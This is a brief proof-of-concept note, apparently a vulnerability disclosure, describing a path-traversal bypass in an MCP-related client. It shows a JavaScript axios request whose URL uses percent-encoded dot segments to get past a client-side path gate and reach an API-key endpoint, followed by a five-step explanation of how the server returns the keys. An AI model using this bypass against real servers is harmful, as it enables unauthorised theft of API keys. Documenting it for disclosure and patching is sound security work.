# MCP Traversal POC

## Proof

```javascript
const axios = require('axios');
// axios decodes %2e before sending
const url = 'http://server/api/spaces/Spaces-1/%2e%2e/%2e%2e/users/me/apikeys';
// Server receives: /api/users/me/apikeys
// Result: 200 OK with API keys
```

## Mechanism

1. Client gate checks raw path (allows %2e)
2. axios decodes %2e → .
3. Server normalizes ../..
4. Routes to sensitive endpoint
5. Returns API keys
